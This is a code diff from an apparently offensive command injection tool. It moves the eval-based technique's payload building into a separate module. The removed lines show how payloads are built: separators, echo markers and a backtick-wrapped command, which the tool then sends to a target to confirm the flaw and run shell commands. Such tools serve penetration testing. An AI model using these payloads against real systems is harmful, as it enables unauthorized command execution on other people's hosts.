@@ -30,6 +30,8 @@ from src.utils import settings
 from src.core.requests import headers
 from src.core.requests import parameters
 
+from src.core.injections.results_based.techniques.payloads import eval_payloads
+
 """
  The "eval-based" injection technique on Classic OS Command Injection.
 """
@@ -72,14 +74,9 @@ def exploitation(url,delay,filename,http_request_method):
 	  B64_DEC_TRICK = ""
 	  
 	try:
-	  if seperator == ";" :
-	    payload = (seperator + "echo '" + TAG + "'" +
-		       seperator + "echo `" + "echo " + B64_ENC_TAG + B64_DEC_TRICK + "`" +
-		       seperator + "echo '" + TAG + "'" +
-		       seperator
-		      )
-	  else:
-	    pass
+	  
+	  # Eval-based decision payload (check if host is vulnerable).
+	  payload = eval_payloads.decision(seperator,TAG,B64_ENC_TAG,B64_DEC_TRICK)
 	  
 	  # Check if defined "--prefix" option.
 	  if menu.options.prefix:
@@ -260,13 +257,9 @@ def exploitation(url,delay,filename,http_request_method):
 		  sys.exit(0)
 		  
 		else:
-		  payload = (seperator + "echo '" + TAG + "'" +
-	                    seperator + "echo `" + "echo " + TAG + "`" +
-			    seperator + "echo `" + cmd + "`" +
-			    seperator + "echo `" + "echo " + TAG + "`" +
-			    seperator + "echo '" + TAG + "'" +
-			    seperator
-			    )
+		  
+		  # Execute shell commands on vulnerable host.
+		  payload = eval_payloads.cmd_execution(seperator,TAG,cmd)
 		  
 		  payload = re.sub(" ","%20", payload)
 
